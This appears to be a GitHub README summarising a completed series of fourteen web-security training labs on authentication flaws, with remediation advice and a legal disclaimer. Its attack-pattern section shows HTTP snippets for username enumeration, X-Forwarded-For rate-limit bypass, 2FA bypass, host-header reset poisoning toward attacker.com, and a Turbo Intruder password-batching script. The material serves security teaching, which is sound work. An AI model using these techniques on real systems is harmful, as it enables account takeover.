# 🔐 Authentication Vulnerabilities - Complete Lab Series

<div align="center">

![Authentication Security](https://img.shields.io/badge/Category-Authentication%20Security-critical?style=for-the-badge&logo=shield&logoColor=white)
![Labs Completed](https://img.shields.io/badge/Labs%20Completed-14%2F14-success?style=for-the-badge&logo=checkmarked&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Expert-orange?style=for-the-badge&logo=target&logoColor=white)
![Status](https://img.shields.io/badge/Status-100%25%20Complete-brightgreen?style=for-the-badge&logo=statuspage&logoColor=white)

**Master authentication exploitation through 14 comprehensive hands-on labs**

[🔗 Main Repository](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) • [👤 About Me](https://github.com/Gurpreet-Singh-offensive-Security) • [📧 Contact](mailto:gskhalsa6245@gmail.com)

</div>

---

## 📋 Overview

Complete hands-on lab series exploring **Authentication Vulnerabilities** in modern web applications. Progressing from foundational flaws to expert-level multi-stage attacks, these 14 labs demonstrate real-world exploitation techniques against vulnerable authentication systems.

### 🏆 Achievement Stats

```
📊 Completion: 100% (14/14 labs)
🎓 Breakdown:
   ├─ 🟢 Apprentice:    3 labs (21%)
   ├─ 🟡 Practitioner:  9 labs (64%)
   └─ 🔴 Expert:        2 labs (15%)

⏱️  Investment: 40+ hours hands-on exploitation
🛠️  Tools: Burp Suite Pro, Turbo Intruder, Python
📝 Documentation: Professional walkthroughs with CVSS scoring
```

---

## 🎯 What are Authentication Vulnerabilities?

Authentication vulnerabilities occur when web applications fail to properly verify user identity, allowing attackers to **bypass security controls**, **impersonate users**, or **compromise credentials**. These represent some of the **most critical security risks** in web applications (OWASP Top 10).

### 💥 Real-World Impact

| Impact Type | Consequence | Severity |
|-------------|-------------|----------|
| 🚨 **Account Takeover** | Complete compromise including admin access | 🔴 Critical |
| 💰 **Financial Fraud** | Unauthorized transactions and theft | 🔴 Critical |
| 📊 **Data Breaches** | Access to sensitive PII and corporate data | 🔴 Critical |
| 🔑 **Credential Harvesting** | Mass account compromise | 🟠 High |
| 🎭 **Identity Theft** | Impersonation and reputation damage | 🟠 High |

**Statistics:**
- 💸 Average breach cost: **$4.45M** (IBM 2023)
- ⚖️ GDPR fines: Up to **€20M** or **4% of revenue**
- 📉 Post-breach stock impact: **-7.27%** average
- ⏱️ Average detection time: **277 days**

---

## 🗺️ Lab Series Structure

| # | Lab Title | Difficulty | Focus Area | Key Techniques |
|---|-----------|------------|------------|----------------|
| 1 | [Username Enumeration via Different Responses](./LAB-1-AUTHENTICATION.md) | 🟢 Apprentice | User Enumeration | Response comparison analysis ( 300 login { Intruder Results})|
| 2 | [2FA Simple Bypass](./LAB-2-AUTHENTICATION.md) | 🟢 Apprentice | MFA Bypass | Direct path manipulation -- Path Change from Login to my account in url directly |
| 3 | [Password Reset Broken Logic](./LAB-3-AUTHENTICATION.md) | 🟢 Apprentice | Password Reset | Forgot Password Token Removal -- New Credentials Reset |
| 4 | [Username Enumeration via Subtly Different Responses](./LAB-4-AUTHENTICATION.md) | 🟡 Practitioner | User Enumeration | Grep pattern matching ( Invalid Username or password . or no . ) -- password finding -- account takeover |
| 5 | [Username Enumeration via Response Timing](./LAB-5-AUTHENTICATION.md) | 🟡 Practitioner | Timing Attacks | X-Forwarded-For Header Injection ( Rate Limit Bypass) -- timing observer valid vs invalid response time difference -- increased password length -- actual username enumerated with longest response -- password finding -- account takeover |
| 6 | [Broken Brute-Force Protection (IP Block)](./LAB-6-AUTHENTICATION.md) | 🟡 Practitioner | Brute Force | IP Roatation Bypass by Valid Account entries before lockout after 2 invalid entries by Turbo Intruder -- Attached Wordlists in Intruder -- Victim Account Enumerated ) 
| 7 | [Username Enumeration via Account Lock](./LAB-7-AUTHENTICATION.md) | 🟡 Practitioner | Account Lockout | No Ip restriction to invalid accounts -- Cluster bomb by muliple passwords with each username and multiple usernames -- Account lockout for actual username due to multiple wrong passwords -- Password Finding -- Account Takeover |
| 8 | [2FA Broken Logic](./LAB-8-AUTHENTICATION.md) | 🟡 Practitioner | MFA Bypass | Cookie manipulation by verify parameter -- actual account mfa request intercdepted -- changed parameter -- code finding-- session token received in valid code response in intruder results -- session token changed in attacker browser -- account takeover |
| 9 | [Brute-Forcing Stay-Logged-In Cookie](./LAB-9-AUTHENTICATION.md) | 🟡 Practitioner | Session Attacks | Stay in login cookie weak encoding in Base64/MD5 -- Decode in Decoder -- ID parameter set to Victim -- Password Payload Processign set according stay in login session cookie format -- Stay in Login Cookie Captured  |
| 10 | [Offline Password Cracking](./LAB-10-AUTHENTICATION.md) | 🟡 Practitioner | Cryptanalysis | Weak Encoded Base 64 MD5 HASH Stay in Login cookie observed + XSS -- Created Payload to capture stay in login cookie -- Link Clicked by Victim -- Got Cookie - Decode in Decoder -- Decrypted by Hashcat -- Credentials Submitted in Webpage -- Accounts Takeover |
| 11 | [Password Reset Poisoning via Middleware](./LAB-11-AUTHENTICATION.md) | 🟡 Practitioner | Header Injection | Session Token removed and id parameter changed 302 -- broken session bound logic-- temp forgot password reset link manipulation by host header injection -- host header injection used to make webpage trust our exploit server host instead of actual host -- reset link sent by our exploit server to victim -- victim clicked -- victim password token captured -- used captured token to reset victim password -- account compromised |
| 12 | [Password Brute-Force via Password Change](./LAB-12-AUTHENTICATION.md) | 🟡 Practitioner | Logic Flaws | Password Change testing -- Broken Logout Protection -- Rate Limit Bypass -- Valid Credential Enumeration -- Account Compromised |
| 13 | [Broken Brute-Force Protection (Multiple Credentials)](./LAB-13-AUTHENTICATION.md) | 🔴 Expert | Advanced Bypass JSON | Credentials Captured in JSON format -- Can add thousands of passwords in Json {} -- Got session token if any valid password present -- session token change in attacker webpage -- account compromised |
| 14 | [2FA Bypass Using Brute-Force Attack](./LAB-14-AUTHENTICATION.md) | 🔴 Expert | Advanced MFA | CSRF token got issued FOR single time MFA session -- MACRO all those login request from  GET LOGIN -- POST LOGIN -- POST LOGIN2 ( FAKE MFA ENTRY AND GET CSRF TOKEN) -- restore session by macro for multiple mfas attempts-- got mfa captured with same process in victim account compromise stage-- got sesion token with valid mfa -- account comprmise by attacker webpagte session replacement ( catch ) { there was no short time than we required to guess 4 digit code for mfa to get invalid }|
---

## 🎓 Learning Path

### Prerequisites
- HTTP/HTTPS protocol fundamentals
- Burp Suite Proxy & Repeater proficiency
- Understanding of authentication flows
- Cookie and session management concepts
- Basic JSON/Base64 encoding knowledge

### Recommended Order

**Phase 1: Foundations** (Labs 1-3)
- Master basic enumeration and bypass techniques
- Understand common authentication flaws

**Phase 2: Intermediate** (Labs 4-9)
- Advanced enumeration (timing, subtlety)
- Brute force protection bypass
- Session cookie attacks

**Phase 3: Advanced** (Labs 10-12)
- Cryptographic attacks
- Infrastructure exploitation
- Multi-stage attack chains

**Phase 4: Expert** (Labs 13-14)
- Advanced automation (Turbo Intruder)
- Complex MFA bypass techniques

### Skills Developed

✅ Systematic user enumeration  
✅ Brute force protection bypass  
✅ MFA/2FA exploitation  
✅ Password reset attacks  
✅ Session hijacking  
✅ Burp Suite automation mastery  
✅ Cryptanalysis & hash cracking  
✅ Professional security reporting  

---

## 🛠️ Tools & Setup

### Required Tools

- **Burp Suite Professional** - Primary testing platform
- **Python 3.x** - Script automation
- **HashCat/John the Ripper** - Password cracking
- **Web Browser** - Firefox/Chrome with proxy
- **PortSwigger Academy Account** - Lab access

### Environment Setup

```bash
# 1. Configure Burp Proxy
Browser Proxy: 127.0.0.1:8080
Install Burp CA certificate

# 2. Burp Settings
Intruder → Threads: 10-20
Options → Sessions: Configure macros

# 3. Wordlists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
```

---

## 🎨 Common Attack Patterns

### Pattern 1: Username Enumeration

**Vulnerability:** Different responses reveal valid usernames

```http
POST /login
username=validuser&password=wrong
→ "Incorrect password"

POST /login
username=invalid&password=wrong
→ "Invalid username"
```

**Exploitation:**
1. Capture login request in Burp
2. Send to Intruder, mark username position
3. Load username wordlist
4. Filter by response differences

---

### Pattern 2: Brute Force Protection Bypass

**Vulnerability:** IP-based rate limiting via header manipulation

```http
POST /login
X-Forwarded-For: 1.2.3.4

→ Rate limit bypassed (appears from different IP)
```

**Exploitation:**
1. Pitchfork attack: passwords + rotating IPs
2. Each request from "different" IP
3. Bypass rate limiting completely

---

### Pattern 3: 2FA/MFA Logic Bypass

**Type A: Direct Path Access**
```http
POST /login → GET /verify-2fa → GET /my-account
                                 ↑ BYPASS!
```

**Type B: Session Manipulation**
```http
Cookie: verify=myusername → verify=victim
Brute force victim's 2FA code (0000-9999)
```

---

### Pattern 4: Password Reset Exploitation

**Host Header Poisoning:**
```http
POST /forgot-password
Host: vulnerable-site.com
X-Forwarded-Host: attacker.com

→ Reset link sent to attacker.com/reset?token=...
```

**Parameter Tampering:**
```http
POST /reset-password
username=myaccount&token=valid&new-password=hacked

→ Change username to victim → password reset!
```

---

### Pattern 5: Session Cookie Exploitation

**Weak Cookie Generation:**
```
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

Base64 decode:
→ wiener:51dc30ddc473d43a6011e9ebba6ca770

Analysis:
username:md5(password)
→ Crack MD5 hash → Generate valid cookie
```

---

### Pattern 6: JSON Array Injection (Expert)

**Traditional:**
```json
{"username": "carlos", "password": "password123"}
```

**Exploited:**
```json
{
  "username": "carlos",
  "password": ["pass1", "pass2", ..., "pass100"]
}
```

**Turbo Intruder Script:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint)
    passwords = []
    
    for password in open('/path/wordlist.txt'):
        passwords.append(password.strip())
        if len(passwords) == 100:
            engine.queue(target.req, json.dumps(passwords))
            passwords = []
```

---

## 🛡️ Defense & Remediation

### Secure Implementation

#### Username Enumeration Prevention
```python
# ❌ VULNERABLE
if not userExists(username):
    return "Invalid username"
else:
    return "Incorrect password"

# ✅ SECURE
return "Invalid username or password"  # Generic message
+ Constant-time comparisons
+ Consistent response timing
```

#### Brute Force Protection
```python
# ✅ Multi-Layer Defense
- Account lockout (5 attempts)
- Progressive delays (exponential backoff)
- CAPTCHA after 3 failures
- Server-side rate limiting (don't trust headers!)
- Anomaly detection

# Real IP extraction
real_ip = request.connection.remote_addr
# NOT: request.headers['X-Forwarded-For']
```

#### Secure 2FA Implementation
```python
# ✅ Best Practices
- Cryptographically random codes
- Server-side user binding (not in cookies!)
- Limited attempts (3-5 max)
- Code expiration (5 minutes)
- One-time use enforcement
- Rate limiting on verification endpoint
```

#### Password Reset Security
```python
# ✅ Secure Token Generation
import secrets
token = secrets.token_urlsafe(32)

# Store with metadata
reset_tokens[token] = {
    'user_id': user.id,
    'created': datetime.now(),
    'used': False,
    'expires': datetime.now() + timedelta(hours=1)
}

# Use application's own domain
reset_url = f"https://yourdomain.com/reset?token={token}"
# NOT: f"https://{request.headers['Host']}/..."
```

#### Session Management
```python
# ✅ Secure Session Cookies
session_cookie = {
    'value': secrets.token_urlsafe(64),
    'httponly': True,    # Prevent XSS
    'secure': True,      # HTTPS only
    'samesite': 'Strict', # CSRF protection
    'max_age': 3600      # 1 hour
}

# ❌ NEVER use:
# - md5(username:password)
# - Base64(credentials)
# - Predictable tokens
```

### Security Checklist

| Control | Implementation | Priority |
|---------|----------------|----------|
| 🔐 Password Policy | Min 12 chars, no common passwords | 🔴 Critical |
| 🔒 MFA Enforcement | Required for all accounts | 🔴 Critical |
| ⏱️ Rate Limiting | Server-side, per-account + per-IP | 🔴 Critical |
| 🎫 Session Security | Secure cookies, short expiry | 🔴 Critical |
| 👤 No Enumeration | Generic errors, consistent timing | 🟠 High |
| 🔑 Secure Reset | Cryptographic tokens, expiration | 🟠 High |

---

## 💡 Key Takeaways

### Top Vulnerabilities Found
1. **Generic response failures** - Apps leak user existence
2. **Client-side trust** - Trusting cookies/headers for authentication
3. **Weak rate limiting** - IP-based or header-dependent controls
4. **MFA logic flaws** - Skippable or poorly implemented
5. **Predictable tokens** - Weak session/reset token generation

### Defense Priorities
1. **Never trust client input** for security decisions
2. **Defense in depth** - Multiple security layers
3. **Secure randomness** - Cryptographic token generation
4. **Consistent behavior** - Same timing, same errors
5. **Server-side enforcement** - All security checks

### Industry Statistics
```
🎯 Authentication Attack Prevalence:
├─ 81% of breaches involve weak/stolen passwords
├─ 2FA reduces account takeover by 99.9%
├─ Average password reuse: 13 accounts
├─ 51% reuse passwords everywhere
└─ $4.45M average credential compromise cost
```

---

## 📚 Additional Resources

### Official Documentation
- [PortSwigger Authentication Labs](https://portswigger.net/web-security/authentication)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [OWASP Top 10 - A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

### Research & Talks
- "The Science of Guessing" - Joseph Bonneau (IEEE S&P)
- "Pwning Multi-Factor Authentication" - Duo Security (DEF CON)
- "OAuth 2.0 Security" - Philippe De Ryck (OWASP)

### Testing Tools
- **Burp Suite Professional** - https://portswigger.net/burp/pro
- **Turbo Intruder** - https://portswigger.net/research/turbo-intruder
- **HashCat** - https://hashcat.net/hashcat/
- **SecLists Wordlists** - https://github.com/danielmiessler/SecLists

### Related Topics
- Session Management Attacks
- OAuth & SAML Exploitation
- API Authentication (JWT, API keys)
- Password Cracking Techniques
- Social Engineering

---

## 🎯 Lab Completion Tracker

### 🟢 Apprentice Level
- [x] Lab 1: Username Enumeration via Different Responses
- [x] Lab 2: 2FA Simple Bypass
- [x] Lab 3: Password Reset Broken Logic

### 🟡 Practitioner Level
- [x] Lab 4: Username Enumeration via Subtly Different Responses
- [x] Lab 5: Username Enumeration via Response Timing
- [x] Lab 6: Broken Brute-Force Protection (IP Block)
- [x] Lab 7: Username Enumeration via Account Lock
- [x] Lab 8: 2FA Broken Logic
- [x] Lab 9: Brute-Forcing Stay-Logged-In Cookie
- [x] Lab 10: Offline Password Cracking
- [x] Lab 11: Password Reset Poisoning via Middleware
- [x] Lab 12: Password Brute-Force via Password Change

### 🔴 Expert Level
- [x] Lab 13: Broken Brute-Force Protection (Multiple Credentials)
- [x] Lab 14: 2FA Bypass Using Brute-Force Attack

---

## 🤝 Contributing

Found improvements? Contributions welcome!

1. Fork the repository
2. Create feature branch
3. Submit pull request with details

---

## ⚖️ Legal & Ethical Notice

<div align="center">

### ⚠️ CRITICAL DISCLAIMER

**All techniques documented are for:**
- ✅ Authorized security testing only
- ✅ Educational purposes in controlled environments
- ✅ Professional penetration testing with explicit permission

</div>

**Unauthorized access to computer systems is illegal** under:
- 🇺🇸 Computer Fraud and Abuse Act (CFAA) - Up to 20 years
- 🇬🇧 Computer Misuse Act 1990 - Up to 10 years
- 🇪🇺 ePrivacy Directive - €20M or 4% revenue
- 🇨🇦 Criminal Code Section 342.1 - Up to 10 years

**The author assumes NO LIABILITY for misuse. Use responsibly and legally.**

---

## 👨‍💻 Author & License

<div align="center">

### Created by Gurpreet Singh

**Offensive Security Researcher | Red Team Engineer in Training**

[![GitHub](https://img.shields.io/badge/GitHub-Offensive--Security--Labs-181717?style=for-the-badge&logo=github)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/gurpreetsingh-security)
[![Email](https://img.shields.io/badge/Email-Contact-D14836?style=for-the-badge&logo=gmail)](mailto:gskhalsa6245@gmail.com)

---

### 📄 License

**CC BY-NC-ND 4.0** (Attribution-NonCommercial-NoDerivatives)

**Copyright © 2025 Gurpreet Singh. All rights reserved.**

</div>

---

## 🎓 Acknowledgments

- **PortSwigger Web Security Academy** - Excellent training platform
- **OWASP Community** - Comprehensive security documentation
- **InfoSec Community** - Knowledge sharing culture

---

<div align="center">

### 🏆 Achievement Summary

| Metric | Value |
|--------|-------|
| **Labs Completed** | 14/14 ✅ |
| **Apprentice** | 3/3 ✅ |
| **Practitioner** | 9/9 ✅ |
| **Expert** | 2/2 ✅ |
| **Hours Invested** | 40+ 🎯 |

### 🎯 What's Next?

➡️ **SQL Injection Labs** - Database exploitation techniques  
➡️ **Cross-Site Scripting (XSS)** - Client-side injection attacks  
➡️ **Access Control** - Privilege escalation & authorization bypass  

---

**🔴 Series Complete** | **🛡️ Authentication Expert** | **💻 14/14 Documented**

**Good luck and happy hunting! 🎯🔒**

</div>
